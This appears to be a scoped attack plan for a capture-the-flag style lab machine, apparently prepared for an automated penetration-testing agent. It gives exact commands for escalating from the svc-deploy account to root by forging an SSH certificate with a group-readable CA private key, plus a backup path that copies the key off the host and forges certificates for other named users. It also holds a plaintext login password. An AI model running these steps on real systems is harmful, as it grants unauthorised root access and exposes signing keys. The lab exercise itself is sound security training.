scope.objective: Escalate from svc-deploy to root via SSH CA certificate forgery. Read root.txt.
in_scope: Sign public key with CA private key at /opt/principal/ssh/ca (principal=root)
SSH as root using forged certificate
scope.out_of_scope: Lateral movement, modifying SSH config, persistence, touching other hosts
stop_conditions: CA key not usable for signing (permissions changed, encrypted)

primary_path: SSH CA cert forgery: 1) ssh-keygen -t ed25519 -f /tmp/pwn -N "" 2) ssh-keygen -s /opt/principal/ssh/ca -I root-cert -n root -V +1h /tmp/pwn.pub 3) ssh -i /tmp/pwn -o CertificateFile=/tmp/pwn-cert.pub root@localhost (or root@10.129.244.220). Then cat /root/root.txt.
backup_path: If cert signing fails on target, download the CA key to Kali, sign locally, then SSH with cert from Kali. If root login is blocked even with cert, try forging cert for other users (admin, jthompson, amorales) who may have sudo.

vulnerability_primitive.primitive: Readable SSH CA private key + no AuthorizedPrincipalsFile = forge certificate for any user including root
delivery_forms: Sign on target with ssh-keygen -s (primary — simplest)
Download CA key to Kali, sign locally, SSH from Kali
vulnerability_primitive.defenses_observed: PermitRootLogin prohibit-password (allows cert, blocks password). No AuthorizedPrincipalsFile.

process_model.foreground: SSH session as svc-deploy, then SSH as root
process_model.critical_note: Use -V +1h for cert validity. Sign on the target itself to avoid key transfer.

notes:
PRIVESC DEPLOYMENT — Session 3.

Access: SSH as svc-deploy / D3pl0y_$$H_Now42!

The CA private key is at /opt/principal/ssh/ca (rw-r----- root:deployers, RSA 4096, unencrypted). svc-deploy can read it via deployers group.

sshd config (60-principal.conf):
  PubkeyAuthentication yes
  PasswordAuthentication yes
  PermitRootLogin prohibit-password
  TrustedUserCAKeys /opt/principal/ssh/ca.pub

No AuthorizedPrincipalsFile is set — OpenSSH accepts any cert principal matching the target login username.

Exact commands:
  ssh-keygen -t ed25519 -f /tmp/pwn -N ""
  ssh-keygen -s /opt/principal/ssh/ca -I root-cert -n root -V +1h /tmp/pwn.pub
  ssh -i /tmp/pwn -o CertificateFile=/tmp/pwn-cert.pub root@localhost
  cat /root/root.txt
